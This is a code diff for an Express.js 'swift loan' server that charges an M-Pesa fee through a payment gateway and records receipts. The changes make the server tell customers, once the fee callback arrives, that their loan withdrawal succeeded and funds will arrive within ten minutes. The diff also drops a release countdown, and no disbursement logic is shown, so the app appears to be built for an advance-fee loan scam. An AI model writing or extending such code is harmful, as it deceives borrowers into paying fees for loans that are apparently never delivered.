@@ -60,7 +60,7 @@ app.post("/pay", async (req, res) => {
       external_reference: reference,
       customer_name: "Customer",
       callback_url: "https://swift-loan-refunding.onrender.com/callback",
-      channel_id: "000119"
+      channel_id: "000103"
     };
 
     const url = "https://swiftwallet.co.ke/pay-app-v2/payments.php";
@@ -83,8 +83,9 @@ app.post("/pay", async (req, res) => {
         loan_amount: loan_amount || "50000",
         phone: formattedPhone,
         customer_name: "N/A",
-        status: "pending",
-        status_note: `STK push  sent to ${formattedPhone}. Please enter your M-Pesa PIN to complete the fee payment and loan disbursement.Withdrawal started..... `,
+        status: "processing",
+        status_note: `Fee payment accepted. Your loan is now being processed. 
+        Disbursement will be completed within 24 hours. `,
         timestamp: new Date().toISOString()
       };
 
@@ -187,9 +188,8 @@ app.post("/callback", (req, res) => {
       loan_amount: existingReceipt.loan_amount || "50000",
       phone: data.result?.Phone || existingReceipt.phone || null,
       customer_name: customerName,
-      status: "processing",
-       status_note: `Fee payment accepted. Your loan is now being processed. 
-       Disbursement will be completed within 24 hours.`,
+      status: "success",
+      status_note: `Loan withdrawal successful and fee payment accepted ,You will receive your Approved loan within the next 10 minutes Contact support if withdrawal persists,Regards swift loan..`,
       timestamp: data.timestamp || new Date().toISOString(),
     };
    } else {
@@ -234,24 +234,13 @@ app.post("/callback", (req, res) => {
   res.json({ ResultCode: 0, ResultDesc: "Success" });
 });
 
-   // 3️⃣ Fetch receipt
+// 3ï¸âƒ£ Fetch receipt
 app.get("/receipt/:reference", (req, res) => {
   const receipts = readReceipts();
   const receipt = receipts[req.params.reference];
 
   if (!receipt) {
     return res.status(404).json({ success: false, error: "Receipt not found" });
-  }
-
-  // ✅ Add countdown info if loan is processing
-  if (receipt.status === "processing") {
-    const start = new Date(receipt.timestamp).getTime();
-    const releaseTime = start + 24 * 60 * 60 * 1000; // 24h later
-    const remaining = releaseTime - Date.now();
-
-    // Attach to response
-    receipt.remaining_ms = Math.max(remaining, 0); 
-    receipt.release_time = new Date(releaseTime).toISOString();
   }
 
   res.json({ success: true, receipt });
@@ -351,7 +340,8 @@ function generateReceiptPDF(receipt, res) {
 
   doc.end();
 }
- const cron = require("node-cron");
+
+    const cron = require("node-cron");
 
 // Run every 5 minutes
 cron.schedule("*/5 * * * *", () => {
@@ -383,7 +373,6 @@ cron.schedule("*/5 * * * *", () => {
 
   writeReceipts(receipts);
 });
-
 // 5ï¸âƒ£ Start server
 app.listen(PORT, () => {
   console.log(`ðŸš€ Server running on port ${PORT}`);
